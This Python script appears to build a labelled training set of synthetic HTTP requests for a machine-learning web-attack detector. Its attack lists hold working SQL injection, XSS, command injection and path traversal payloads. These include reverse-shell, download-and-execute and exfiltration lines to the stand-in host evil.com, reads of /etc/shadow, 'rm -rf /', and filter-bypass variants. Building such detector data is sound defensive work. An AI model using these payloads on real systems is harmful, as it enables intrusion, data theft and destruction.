"""
Generate Realistic HTTP Training Data for ML Model
===================================================
Creates training data that mimics real HTTP requests with:
- Realistic URLs, parameters, headers
- Real-world attack patterns from CVE database
- Proper HTTP request structure
- Supports loading external datasets (CSIC 2010, PKDD, SecLists)
"""
import csv
import random
import urllib.parse
import os
import glob

# Constants for randomization
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
RANDOM_PATHS = [
    "/api/users", "/api/products", "/api/orders", "/api/search",
    "/login", "/register", "/profile", "/dashboard", "/settings",
    "/products/123", "/users/456", "/posts/789",
    "/api/v1/data", "/api/v2/analytics", "/api/reports",
    "/images/logo.png", "/css/style.css", "/js/app.js",
    "/docs/api", "/help/faq", "/about", "/contact",
]
RANDOM_PARAMS = [
    "id", "search", "q", "page", "limit", "filter", "sort", "order",
    "user_id", "action", "lang", "status", "date", "format", "type",
    "name", "email", "category", "price_min", "price_max", "tag", "author",
    "session", "token", "region", "view", "columns", "username", "password",
    "title", "content", "tags", "product_id", "quantity", "color", "phone",
    "city", "comment", "rating", "search_term", "filters", "old_password",
    "new_password", "first_name", "last_name", "age", "order_id", "tracking"
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)",
]

# Benign text snippets to mix with payloads for semantic variations
BENIGN_TEXTS = [
    "hello world", "this is a normal comment", "please find attached",
    "I would like to order", "my address is", "John Doe", "123 Main St",
    "contact me at email@example.com", "best regards", "thank you",
    "test user", "admin access request", "system log entry"
]

def generate_random_request_structure(payload=None, is_attack=False):
    """
    Generates a highly randomized HTTP request structure.
    If payload is provided, injects it into a random parameter or body.
    This prevents the ML model from memorizing fixed templates.
    """
    method = random.choice(HTTP_METHODS)
    path = random.choice(RANDOM_PATHS)
    ua = random.choice(USER_AGENTS)
    
    # Generate 1 to 5 random parameters
    num_params = random.randint(1, 5)
    params = {}
    for _ in range(num_params):
        param_name = random.choice(RANDOM_PARAMS)
        # Give normal values if not injecting payload here
        param_value = random.choice(BENIGN_TEXTS).replace(" ", "+") if random.random() > 0.5 else str(random.randint(1, 1000))
        params[param_name] = param_value

    if payload:
        # Choose a random parameter to hold the malicious payload
        target_param = random.choice(list(params.keys()))
        
        # 50% chance to mix the payload with normal text to confuse simple regex and train ML context
        if random.random() > 0.5:
            mix_prefix = random.choice(BENIGN_TEXTS).split()[0]
            mix_suffix = random.choice(BENIGN_TEXTS).split()[-1]
            params[target_param] = urllib.parse.quote(f"{mix_prefix} {payload} {mix_suffix}")
        else:
            params[target_param] = urllib.parse.quote(payload)
            
    query_string = "&".join([f"{k}={v}" for k, v in params.items()])
    
    if method in ["GET", "DELETE", "HEAD", "OPTIONS"]:
        req_str = f"{method} {path}?{query_string} User-Agent: {ua}"
    else:
        # For POST/PUT, parameters often go in the body
        req_str = f"{method} {path} {query_string} User-Agent: {ua}"
        
    return req_str

def generate_realistic_normal_requests():
    """Generate realistic normal HTTP requests using random structures"""
    requests = []
    # Generate 350 normal requests
    for _ in range(350):
        requests.append(generate_random_request_structure(is_attack=False))
    return requests

def generate_realistic_sql_injection():
    """Generate realistic SQL injection attacks with structural variations"""
    sql_patterns = [
        # UNION-based
        "' UNION SELECT NULL,NULL,NULL--",
        "1' UNION ALL SELECT username,password,email FROM users--",
        "' UNION SELECT @@version,NULL,NULL--",
        "1' UNION SELECT table_name FROM information_schema.tables--",
        # Boolean-based blind
        "' AND 1=1--", "' AND 1=2--", "' AND 'x'='x", "' AND 'x'='y",
        "1' AND SUBSTRING(@@version,1,1)='5'--",
        # Time-based blind
        "'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--",
        "1' AND IF(1=1,SLEEP(5),0)--", "'; SELECT pg_sleep(5)--",
        # Error-based
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        # Stacked queries
        "'; DROP TABLE users--", "'; DELETE FROM products WHERE 1=1--",
        # Authentication bypass
        "admin'--", "admin'#", "admin'/*", "' OR '1'='1'--", "' OR 1=1--",
        "admin' OR '1'='1",
    ]
    
    attacks = []
    for _ in range(250):
        pattern = random.choice(sql_patterns)
        attacks.append(generate_random_request_structure(payload=pattern, is_attack=True))
    return attacks

def generate_realistic_xss():
    """Generate realistic XSS attacks with structural variations"""
    xss_patterns = [
        "<script>alert(document.cookie)</script>",
        "<script src='http://evil.com/xss.js'></script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(document.domain)>",
        "<a href='javascript:alert(1)'>click</a>",
        "<iframe src='javascript:alert(1)'>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<svg/onload=alert(1)>",
    ]
    
    attacks = []
    for _ in range(200):
        pattern = random.choice(xss_patterns)
        attacks.append(generate_random_request_structure(payload=pattern, is_attack=True))
    return attacks

def generate_realistic_command_injection():
    """Generate realistic command injection attacks with enhanced bypasses"""
    cmd_patterns = [
        # Standard
        "; ls -la", "| cat /etc/passwd", "& whoami", "`id`",
        "$(cat /etc/shadow)", "; wget http://evil.com/shell.sh",
        "| curl http://evil.com/backdoor", "; rm -rf /",
        "& nc -e /bin/bash evil.com 4444",
        
        # Bypasses (Space bypass, quoting, base64) - Improves Generalization!
        ";cat${IFS}/etc/passwd", 
        "|c'a't /etc/passwd",
        ";/bin/c?? /etc/p????d",
        "`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`",
        "|awk '{print $1}' /etc/passwd",
        "& $(which bash) -c 'ls'",
        "; $(printf '\\x6c\\x73')", # Hex bypass
    ]
    
    attacks = []
    # Increased count to give model more examples of cmd injection variations
    for _ in range(150):
        pattern = random.choice(cmd_patterns)
        attacks.append(generate_random_request_structure(payload=pattern, is_attack=True))
    return attacks

def generate_realistic_path_traversal():
    """Generate realistic path traversal attacks with structural variations"""
    path_patterns = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\system32",
        "/var/www/../../etc/passwd",
        "file:///etc/passwd",
    ]
    
    attacks = []
    for _ in range(100):
        pattern = random.choice(path_patterns)
        attacks.append(generate_random_request_structure(payload=pattern, is_attack=True))
    return attacks

def load_external_datasets(directory="data/external"):
    """
    Imports real-world datasets if present. 
    Supports CSIC 2010, PKDD, and generic SecLists payloads.
    This massively improves generalization by bringing in wild patterns.
    """
    external_data = []
    # Create the directory relative to this script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    ext_dir = os.path.join(script_dir, directory)
    
    if not os.path.exists(ext_dir):
        os.makedirs(ext_dir, exist_ok=True)
        print(f"[INFO] Created {ext_dir}. Drop SecLists or CSIC CSV files here to enhance training.")
        return external_data

    # Look for any CSV files in the external data directory
    for filepath in glob.glob(f"{ext_dir}/*.csv"):
        print(f"[*] Loading external dataset: {filepath}")
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                for row in reader:
                    if len(row) >= 2:
                        # Expecting format: text, label
                        text = row[0]
                        try:
                            label = int(row[1])
                            if label in [0, 1]:
                                external_data.append({"text": text, "label": label})
                        except ValueError:
                            continue
        except Exception as e:
            print(f"[!] Error reading {filepath}: {e}")
            
    # Look for .txt files containing raw payloads (assume malicious if in a 'payloads' folder)
    for filepath in glob.glob(f"{ext_dir}/*.txt"):
        print(f"[*] Loading external payloads: {filepath}")
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Wrap payload in a random request structure
                        req = generate_random_request_structure(payload=line, is_attack=True)
                        external_data.append({"text": req, "label": 1})
        except Exception as e:
            print(f"[!] Error reading {filepath}: {e}")

    if external_data:
        print(f"[SUCCESS] Loaded {len(external_data)} external real-world samples!")
    return external_data

def save_to_csv(filename="data/ml_training_data.csv"):
    """Save realistic training data to CSV, including external datasets."""
    
    # Ensure correct relative path to data folder
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(script_dir, filename)
    
    print("Generating realistic synthetic training data...")
    
    normal_data = generate_realistic_normal_requests()
    sql_data = generate_realistic_sql_injection()
    xss_data = generate_realistic_xss()
    cmd_data = generate_realistic_command_injection()
    path_data = generate_realistic_path_traversal()
    
    all_data = []
    
    # Label: 0 = Normal, 1 = Attack
    for text in normal_data:
        all_data.append({"text": text, "label": 0})
    for text in sql_data:
        all_data.append({"text": text, "label": 1})
    for text in xss_data:
        all_data.append({"text": text, "label": 1})
    for text in cmd_data:
        all_data.append({"text": text, "label": 1})
    for text in path_data:
        all_data.append({"text": text, "label": 1})
        
    # Merge with real-world datasets
    external_data = load_external_datasets()
    all_data.extend(external_data)
    
    # Shuffle to avoid ordering bias
    random.shuffle(all_data)
    
    # Save to CSV
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['text', 'label'])
        writer.writeheader()
        writer.writerows(all_data)
    
    print(f"\n[SUCCESS] Generated {len(all_data)} total samples")
    print(f"   Normal requests: {len(normal_data)} (Synthetic)")
    print(f"   SQL Injection: {len(sql_data)} (Synthetic)")
    print(f"   XSS: {len(xss_data)} (Synthetic)")
    print(f"   Command Injection: {len(cmd_data)} (Synthetic)")
    print(f"   Path Traversal: {len(path_data)} (Synthetic)")
    print(f"   External (Real-world): {len(external_data)}")
    print(f"\n[INFO] Saved to: {out_path}")
    print(f"\n[INFO] Next step: python train_model.py")


if __name__ == "__main__":
    save_to_csv()
